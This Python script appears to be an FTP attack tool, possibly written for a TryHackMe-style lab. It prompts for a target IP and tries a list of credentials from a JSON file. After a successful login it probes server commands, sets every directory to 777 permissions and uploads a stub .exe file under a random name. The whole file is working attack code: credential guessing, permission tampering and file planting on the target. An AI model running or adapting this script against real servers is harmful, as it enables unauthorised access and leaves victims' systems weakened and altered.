import ftplib
import json
import socket
from io import BytesIO
import random
import string
import struct
import os

def is_ftp_port_open(ip, port=21):
    try:
        with socket.create_connection((ip, port), timeout=3):
            print("FTP port is open and responding")
            return True
    except Exception as e:
        print("FTP port check failed:", str(e))
        return False

# Generate a simple .exe that prints a message on command line when run
def generate_exe_file():
    # A minimal "exe" structure, typically it would be much more complex,
    # here we simulate it with a simple binary structure
    exe_content = b"MZ"  # Start of an executable (DOS header)
    exe_content += b"\x90" * 100  # Padding for the header
    exe_content += b"This is a test executable that prints a message on command line."
    
    # Normally, .exe files are structured with a proper PE header,
    # but this is just a simulation for your testing.
    return exe_content

def generate_thm_txt_file():
    thm_txt_content = b"thm.txt file content"
    return thm_txt_content

# Generate a random filename with the given extension.
def generate_random_filename(extension):
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return f"{name}.{extension}"

def try_upload_file(ftp):
    try:
        # Create the thm.txt file
        # thm_txt_content = generate_thm_txt_file()
        # ftp.storbinary(f"STOR thm.txt", BytesIO(thm_txt_content))
        # print("[UPLOADED] Created thm.txt file.")

        # Generate and upload a .exe file
        exe_content = generate_exe_file()
        exe_file_name = generate_random_filename("exe")
        ftp.storbinary(f"STOR {exe_file_name}", BytesIO(exe_content))
        print(f"[UPLOADED] Created executable file: {exe_file_name}")

    except Exception as e:
        print(f"[FAILED] Could not upload files: {e}")

def list_files(ftp):
    try:
        print("\n[FILES & PERMISSIONS]")
        ftp.dir()
    except Exception as e:
        print(f"[ERROR] Could not list files: {e}")

def chmod_all_dirs(ftp):
    try:
        print("\n[CHMOD] Attempting to set folder permissions to 777...")
        items = []
        ftp.retrlines('LIST', items.append)
        permission_changed = False
        for line in items:
            parts = line.split()
            if len(parts) < 9:
                continue
            name = " ".join(parts[8:])
            file_type = parts[0][0]
            if file_type == 'd':
                try:
                    ftp.sendcmd(f'SITE CHMOD 777 {name}')
                    print(f"[CHMOD] Changed permissions for directory: {name}")
                    permission_changed = True
                except Exception as e:
                    print(f"[FAILED] Could not change permissions for {name}: {e}")
        if permission_changed:
            print("\n[UPDATED FILE LIST AFTER CHMOD]")
            list_files(ftp)
    except Exception as e:
        print(f"[ERROR] CHMOD operation failed: {e}")

def get_ftp_info_before_login(ftp):
    print("\n" + "=" * 50)
    print("FTP INFORMATION BEFORE LOGIN")
    print("=" * 50)

    results = {}

    def show(label, value):
        print(label)
        print(value)
        print()

    # Banner
    try:
        banner = ftp.getwelcome()
        results["Banner"] = banner
        show("Banner", banner)
    except Exception as e:
        results["Banner"] = None

    commands = {
        "Features (FEAT)": "FEAT",
        "System Type (SYST)": "SYST",
        "Passive Mode (PASV)": "PASV",
        "Extended Passive (EPSV)": "EPSV",
        "Help (HELP)": "HELP",
        "Server Status (STAT)": "STAT"
    }

    for label, cmd in commands.items():
        try:
            response = ftp.sendcmd(cmd)
            results[label] = response
            show(label, response)
        except Exception as e:
            results[label] = None

    return results

def get_ftp_info_after_login(ftp, pre_login_results):
    print("\n" + "=" * 50)
    print("FTP INFORMATION AFTER LOGIN")
    print("=" * 50)

    def show(label, value):
        print(label)
        print(value)
        print()

    # Retry commands that failed before login
    for label, cmd in {
        "System Type (SYST)": "SYST",
        "Passive Mode (PASV)": "PASV",
        "Extended Passive (EPSV)": "EPSV",
        "Help (HELP)": "HELP",
        "Server Status (STAT)": "STAT"
    }.items():
        if label not in pre_login_results or pre_login_results[label] is None:
            try:
                response = ftp.sendcmd(cmd)
                show(label, response)
            except Exception as e:
                show(label, f"Not Available ({str(e)})")

    try:
        show("Current Directory (PWD)", ftp.pwd())
    except Exception as e:
        show("Current Directory (PWD)", f"Not Available ({str(e)})")

    print("Directory Listing (LIST):")
    try:
        ftp.dir()
    except Exception as e:
        print(f"LIST failed: {str(e)}")
    print()

    commands = [
        ("File Size (SIZE)", "SIZE"),
        ("Last Modified (MDTM)", "MDTM"),
        ("Modify Time (MFMT)", "MFMT"),
        ("Account Info (ACCT)", "ACCT")
    ]

    for label, cmd in commands:
        try:
            response = ftp.sendcmd(cmd)
            show(label, response)
        except Exception as e:
            show(label, f"Not Available ({str(e)})")

    print("Directory Access Test:")
    for d in ["/", "/restricted"]:
        try:
            ftp.cwd(d)
            print(f"Access to {d}")
            print("Success\n")
        except Exception as e:
            print(f"Access to {d}")
            print(f"Failed ({str(e)})\n")

    print("SITE CHMOD Test:")
    try:
        items = []
        ftp.retrlines('LIST', items.append)
        for line in items:
            parts = line.split()
            if parts and parts[0].startswith('d'):
                name = parts[-1]
                try:
                    response = ftp.sendcmd(f"SITE CHMOD 777 {name}")
                    print(f"Permission change on {name}")
                    print(f"Success: {response}\n")
                except Exception as e:
                    print(f"Permission change on {name}")
                    print(f"Failed: {str(e)}\n")
                break
        else:
            print("No directories found to test CHMOD.\n")
    except Exception as e:
        print(f"CHMOD test failed: {str(e)}\n")

def check_ftp_vulnerability(ip, port):
    if not is_ftp_port_open(ip, port):
        print("Port is not open or does not support FTP")
        return False

    try:
        with open("credentials.json", "r") as file:
            credentials = json.load(file)
    except Exception as e:
        print("Error loading credentials file:", str(e))
        return False

    print(f"\nScanning ftp://{ip}:{port} for FTP login vulnerabilities...\n")

    ftp = ftplib.FTP()
    ftp.connect(ip, port, timeout=5)

    pre_login_results = get_ftp_info_before_login(ftp)

    for entry in credentials:
        username = entry.get("username")
        password = entry.get("password")

        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login(user=username, passwd=password)

            get_ftp_info_after_login(ftp, pre_login_results)

            print(f"[SUCCESS] Access granted with {username} / {password}")
            print(f"[VULNERABLE] FTP service on {ip}:{port} is vulnerable.\n")

            chmod_all_dirs(ftp)

            try_upload_file(ftp)

            list_files(ftp)
            ftp.quit()
            return True
        except ftplib.error_perm:
            continue
        except Exception as e:
            # print(f"[ERROR] An error occurred during FTP login: {e}")
            continue

    print("\n[SECURE] FTP (port 21) is not vulnerable.\n")
    return False

if __name__ == "__main__":
    target_ip = input("Enter target IP: ").strip()
    target_port = input("Enter port (default 21): ").strip()
    port = int(target_port) if target_port else 21
    check_ftp_vulnerability(target_ip, port)
